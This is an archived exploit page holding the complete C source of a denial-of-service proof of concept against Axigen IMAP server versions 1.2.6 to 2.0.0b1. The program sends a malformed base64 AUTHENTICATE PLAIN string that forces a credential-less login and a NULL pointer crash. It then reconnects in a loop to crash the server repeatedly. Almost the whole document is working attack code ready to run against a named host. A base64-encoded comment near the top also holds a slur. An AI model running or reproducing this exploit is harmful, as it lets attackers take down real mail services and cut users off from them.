<html><head><title>Axigen <= 2.0.0b1 Remote Denial of Service Exploit (2)</title></head><pre>/* doaxigen-v2.c
 *
 * axigen 1.2.6 - 2.0.0b1 DoS (x86-lnx)
 * by mu-b - Sun Oct 29 2006
 *
 * - Tested on: AXIGEN 1.2.6 (lnx)
 *              AXIGEN 2.0.0b1 (lnx)
 *
 * parsing error results in login without username &amp; password!
 * which in turn causes a NULL pointer dereference..
 */

/* dGFicyBhcmUgZm9yIGZhZ2dvdHNcIQ== */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;netdb.h&gt;
#include &lt;sys/time.h&gt;
#include &lt;sys/types.h&gt;

#define BUF_SIZE    1024
#define BBUF_SIZE   BUF_SIZE/3*4+1

#define AUTH_CMD    &quot;1 AUTHENTICATE PLAIN\r\n&quot;
#define APPEND_CMD  &quot;2 APPEND digit-labs\r\n&quot;

#define DEF_PORT    143
#define PORT_IMAPD  DEF_PORT

#define RCNT_DELAY  3

static const char base64tab[] =
  &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;;

static int base64 (const u_char * ibuf, u_char * obuf, size_t n);
static int sock_send (int sock, u_char * src, int len);
static int sock_recv (int sock, u_char * dst, int len);
static void zhammer (u_char * host);

static int
base64 (const u_char * ibuf, u_char * obuf, size_t n)
{
  int a, b, c;
  int i, j;
  int d, e, f, g;

  a = b = c = 0;
  for (j = i = 0; i &lt; n; i += 3)
    {
      a = (u_char) ibuf[i];
      b = i + 1 &lt; n ? (u_char) ibuf[i + 1] : 0;
      c = i + 2 &lt; n ? (u_char) ibuf[i + 2] : 0;

      d = base64tab[a &gt;&gt; 2];
      e = base64tab[((a &amp; 3) &lt;&lt; 4) | (b &gt;&gt; 4)];
      f = base64tab[((b &amp; 15) &lt;&lt; 2) | (c &gt;&gt; 6)];
      g = base64tab[c &amp; 63];

      if (i + 1 &gt;= n)
        f = '=';
      if (i + 2 &gt;= n)
        g = '=';

      obuf[j++] = d, obuf[j++] = e;
      obuf[j++] = f, obuf[j++] = g;
    }

  obuf[j++] = '\0';

  return strlen (obuf);
}

static int
sock_send (int sock, u_char * src, int len)
{
  int sbytes;

  sbytes = send (sock, src, len, 0);

  return (sbytes);
}

static int
sock_recv (int sock, u_char * dst, int len)
{
  int rbytes;

  rbytes = recv (sock, dst, len, 0);
  if (rbytes &gt;= 0)
    dst[rbytes] = '\0';

  return (rbytes);
}

static int
sockami (u_char * host, int port)
{
  struct sockaddr_in address;
  struct hostent *hp;
  int sock;

  fflush (stdout);
  if ((sock = socket (AF_INET, SOCK_STREAM, 0)) == -1)
    {
      perror (&quot;socket()&quot;);
      exit (-1);
    }

  if ((hp = gethostbyname (host)) == NULL)
    {
      perror (&quot;gethostbyname()&quot;);
      exit (-1);
    }

  memset (&amp;address, 0, sizeof (address));
  memcpy ((char *) &amp;address.sin_addr, hp-&gt;h_addr, hp-&gt;h_length);
  address.sin_family = AF_INET;
  address.sin_port = htons (port);

  if (connect (sock, (struct sockaddr *) &amp;address, sizeof (address)) == -1)
    {
      perror (&quot;connect()&quot;);
      exit (EXIT_FAILURE);
    }

  return (sock);
}

static void
zhammer (u_char * host)
{
  int sock;
  u_int i;
  u_char *md5 = &quot;*\x00&quot;;  /* what was that? */
  u_char sbuf[BBUF_SIZE], *sptr;
  u_char rbuf[BUF_SIZE];

  fd_set r_fds;
  struct timeval tv;

  base64 (md5, sbuf, strlen (md5)+1);
  sptr = sbuf + strlen (sbuf);
  *sptr++ = '\r', *sptr++ = '\n', *sptr = '\0';

  for (i = 0; i &lt; -1; i++)
    {
      int rbytes;

      printf (&quot;+Connecting to %s:%d. &quot;, host, PORT_IMAPD);
      sock = sockami (host, PORT_IMAPD);
      rbytes = sock_recv (sock, rbuf, sizeof (rbuf) - 1);
      if (rbytes &lt; 0)
        return;

      sock_send (sock, AUTH_CMD, strlen (AUTH_CMD));
      rbytes = sock_recv (sock, rbuf, sizeof (rbuf) - 1);
      if (rbytes &lt; 0)
        break;

      sock_send (sock, sbuf, strlen (sbuf));
      rbytes = sock_recv (sock, rbuf, sizeof (rbuf) - 1);
      if (rbytes &lt; 0)
        break;

      if (!strcmp (rbuf, &quot;1 OK Done AUTHENTICATE&quot;))
        {
          printf (&quot;+Bah not vulnerable\n&quot;);
          exit (EXIT_SUCCESS);
        }

      sock_send (sock, APPEND_CMD, strlen (APPEND_CMD));

      FD_ZERO (&amp;r_fds);
      FD_SET (sock, &amp;r_fds);
      tv.tv_sec = 2;            /* wait 2 seconds */
      tv.tv_usec = 0;

      rbytes = select (sock + 1, &amp;r_fds, NULL, NULL, &amp;tv);
      if (rbytes == -1)         /* oh dear */
        perror (&quot;select()&quot;);
      else if (rbytes &gt; 1)          /* read response */
        {
          printf (&quot;+Bah not vulnerable %d\n&quot;, rbytes);
          exit (EXIT_SUCCESS);
        }

      /* timeout, server appears to have crashed!@$%! */

      printf (&quot;Wh00t\n&quot;);
      fflush (stdout);
      sleep (RCNT_DELAY);
    }
}

int
main (int argc, char **argv)
{
  printf (&quot;axigen 1.2.6 - 2.0.0b1 DoS POC\n&quot;
          &quot;by: &lt;mu-b@digit-labs.org&gt;, &lt;mu-b@65535.com&gt;\n\n&quot;);

  if (argc &lt;= 1)
    {
      fprintf (stderr, &quot;Usage: %s &lt;host&gt;\n&quot;, argv[0]);
      exit (EXIT_SUCCESS);
    }

  zhammer (argv[1]);

  return (EXIT_SUCCESS);
}

// milw0rm.com [2007-02-08]</pre></html>